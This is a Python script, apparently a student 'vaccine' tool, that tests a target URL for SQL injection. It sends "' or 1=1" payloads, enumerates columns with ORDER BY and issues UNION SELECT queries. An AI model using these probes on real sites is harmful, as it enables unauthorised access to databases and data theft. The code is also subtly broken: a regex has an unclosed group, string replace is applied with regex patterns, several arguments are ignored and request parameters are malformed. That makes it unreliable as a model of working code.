#!/usr/bin/python3

import argparse, requests, re, os, sys, difflib


def form_url(url, add):
    if add == "#":
        return url
    if add.startswith('/'):
        if url.endswith('/'):
            url = url[:-1]
        return url + add
    baseurl_match = re.search(r'^(https?://[^/]+', url)
    if not baseurl_match:
        print(f"url {url} is wrong")
        sys.exit(1)
    baseurl = baseurl_match.group()
    return baseurl + '/' + add


def get_diff(str1, str2):
    diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n=0)
    ret = ""
    cnt = 0
    for d in diff:
        cnt += 1
        if cnt < 4 or d.startswith("-"):
            continue
        ret += d[1:].strip() + '\n'
    return ret


def get_result(str1, str2, query=""):
    diff = get_diff(str1, str2)
    result = diff.replace("<b>", "").replace("</b>", "").replace('<(.|\n)*?>', '\n').replace('\n+', '\n')
    if query:
        result = result.replace(query, "[query]")
    return result


def submit(query, delimiter="#"):
    original_text = requests.get(url).text
    normal_text = requests.get(url, params={delimiter: "' or 1=1" + delimiter}).text
    return original_text, normal_text


def error(original_text, normal_text, delimiter="#"):
    flag = 0
    for i in range(1, 12):
        q = f" ORDER BY {i}"
        query = delimiter + q + delimiter
        res = requests.get(url, params=query)
        result = get_diff(original_text, res.text)
        if res.text and not result:
            flag = 1
            continue
        result = get_diff(normal_text, res.text)
        if len(normal_text) == len(res.text):
            flag = 1
            continue
        if not result:
            continue
        break
    column_counts = i - flag
    if column_counts == 0 or column_counts >= 10:
        raise Exception("this method does not work")
    print(f"column counts: {column_counts}")
    return column_counts


def union(original_text, normal_text, column_counts, delimiter="#"):
    try:
        union_query = f"{delimiter} UNION SELECT "
        columns = ", ".join([f"'test_{i}'" for i in range(column_counts)])
        union_query += columns
        response = requests.get(url, params={"query": union_query})
        print(f"Union Query Response: {response.text[:500]}")

    except Exception as e:
        print(f"Error: {str(e)}")


def vaccine(url, method):
    try:
        original_text, normal_text = submit("#")
        column_counts = error(original_text, normal_text, "#")
        union(original_text, normal_text, column_counts, "#")

    except Exception as e:
        print(f"Error: {str(e)}")

    try:
        original_text, normal_text = submit("--")
        column_counts = error(original_text, normal_text, "--")
        union(original_text, normal_text, column_counts, "--")

    except Exception as e:
        print(f"Error: {str(e)}")


def validate_args(args):
    if not args.url.startswith(('https://', 'http://')):
        args.url = 'http://' + args.url
    if args.X != 'POST' and args.X != 'GET':
        print(f"Request type {args.X} not supported")
        sys.exit(1)


def parse_arguments():
    parser = argparse.ArgumentParser("Vaccine programme for testing SQL security")
    parser.add_argument('-o', type=str, default='archive.txt', help="Archive file")
    parser.add_argument('-X', type=str, default='GET', help="Type of request")
    parser.add_argument('url', help="url targeted")
    return parser.parse_args()


def main():
    global url
    args = parse_arguments()
    validate_args(args)
    url = args.url
    vaccine(url, args.X)


if __name__ == "__main__":
    main()

    